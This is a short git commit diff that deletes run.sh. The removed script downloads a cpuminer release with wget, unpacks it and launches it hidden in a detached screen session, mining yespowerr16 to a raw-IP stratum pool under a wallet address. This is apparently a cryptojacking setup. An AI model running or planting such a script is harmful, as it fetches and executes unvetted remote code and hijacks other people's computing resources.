6c5d1bb2e62c17f87527036b549e9ad3e3d3fe6e
abdul <34927384+cecepabdul@users.noreply.github.com>
2023-05-26 08:28:08 +0700

    Delete run.sh

--- run.sh
+++
@@ -1,4 +0,0 @@
-wget https://github.com/smectebet/cpuminer-opt-linux/releases/download/5.0.17/cpuminer-opt-linux.tar.gz && tar -xzvf cpuminer-opt-linux.tar.gz && cd cpuminer-opt-linux
-screen -dmS cpuminer ./cpuminer-sse2 -a yespowerr16 -o stratum+tcp://92.222.110.22:63368 -u YiFp3rQQDuArqezp6bmsdDAP2e81TZcFHD -t 1
-
-
